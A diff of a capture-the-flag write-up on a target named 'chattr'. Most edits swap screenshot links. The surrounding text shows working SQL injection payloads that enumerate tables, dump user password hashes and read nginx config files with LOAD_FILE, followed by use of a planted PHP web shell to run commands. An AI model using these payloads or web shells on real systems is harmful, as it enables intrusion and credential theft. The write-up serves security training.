@@ -69,8 +69,7 @@ Lets start by determine the number of columns we are working with
 - Then the UNION SELECT aligns the columns
 - The result shows that columns "3" and "4" are displayed, and can be used to leak information
 
-<img width="1002" height="446" alt="chattr1" src="https://github.com/user-attachments/assets/58c4efd6-4d61-4998-94ff-df3cc1f625d2" />
-
+<img width="1002" height="446" alt="chattr1" src="https://github.com/user-attachments/assets/7996774b-c05a-4005-beb3-cd448f4d2528" />
 
 Lets try a basic exploit to find the database name with this injection:
 
@@ -78,15 +77,13 @@ Lets try a basic exploit to find the database name with this injection:
 
 - This returns: chattr
 
-<img width="1002" height="446" alt="chattr2" src="https://github.com/user-attachments/assets/475e430f-6b71-4736-971a-3f5f2e154dfb" />
+<img width="1002" height="446" alt="chattr2" src="https://github.com/user-attachments/assets/46979a14-ab4e-443b-ac17-b2db7378bbf2" />
 
 ## Finding The Admin Password:
 
 Now lets enumerate the databases and tables, we can do that with:
 
     ') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES-- -
-
-<img width="1002" height="733" alt="tables" src="https://github.com/user-attachments/assets/1b930255-f2d5-4e37-9ff9-0c3ca0f4c2c2" />
 
 - This returns a long list of information but lets focus on the following:
   - Table: Users
@@ -96,12 +93,15 @@ The next step is to get the column names for the "Users" table:
 
     ') UNION SELECT 1,2,COLUMN_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="Users"-- - 
 
+<img width="1002" height="446" alt="usrPriv" src="https://github.com/user-attachments/assets/9ef96a7c-499b-4582-bc7e-fbcf9bf7a6dd" />
+
 Lets inspect the "Username" and "Password"
 
     ') UNION SELECT 1,2,Username,Password FROM chattr.Users-- -
 
-- This gives us the password hashes!
+<img width="1002" height="733" alt="passwords" src="https://github.com/user-attachments/assets/40ab2e69-2840-4690-a04d-8a831a1df151" />
 
+- This gives us the password hashes!
 
 Next, lets see what permissions are avalible with the payload:
 
@@ -116,12 +116,11 @@ Next, lets see what permissions are avalible with the payload:
 
         ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4-- -
 
-<img width="1002" height="596" alt="conf" src="https://github.com/user-attachments/assets/30a27e33-180b-4612-9578-38fdb363ac51" />
+<img width="1002" height="733" alt="conf" src="https://github.com/user-attachments/assets/b21a284b-2573-4638-aef5-1000f267afda" />
 
 - There is a lot in the output, but lets focus on this:
 
-<img width="1002" height="596" alt="conf_path" src="https://github.com/user-attachments/assets/0320c4f7-f678-46a3-8c58-6b41b4a0b507" />
-
+<img width="1002" height="733" alt="confHostPath" src="https://github.com/user-attachments/assets/675b7b86-ca04-4fbd-a11b-1059e6029e1d" />
 
   - This tells us where the virtual hosts live
 
@@ -131,7 +130,7 @@ Next, lets see what permissions are avalible with the payload:
 
         ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
 
-<img width="1002" height="583" alt="webroot" src="https://github.com/user-attachments/assets/6e2503c4-21d0-4549-90b7-7c85b48cb49d" />
+<img width="1002" height="583" alt="webroot" src="https://github.com/user-attachments/assets/a1e9945f-fe95-475a-90ab-deb37a2aadd0" />
 
 - The webroot is: /var/www/chattr-prod
 
@@ -149,6 +148,9 @@ Given that we have write permissions, let write some malicious code on the serve
             https://154.57.164.78:32157/fSociety.php?0=ls%20/
 
 <img width="1002" height="345" alt="rootDir" src="https://github.com/user-attachments/assets/38d16ccd-c39d-4350-a942-75e149d5d831" />
+
+<img width="821" height="261" alt="root" src="https://github.com/user-attachments/assets/486c3687-68a1-4007-850b-e7a75d4a1f4b" />
+
 
 - The file "flag_876a4c.txt", looks interesting, lets read it.
 
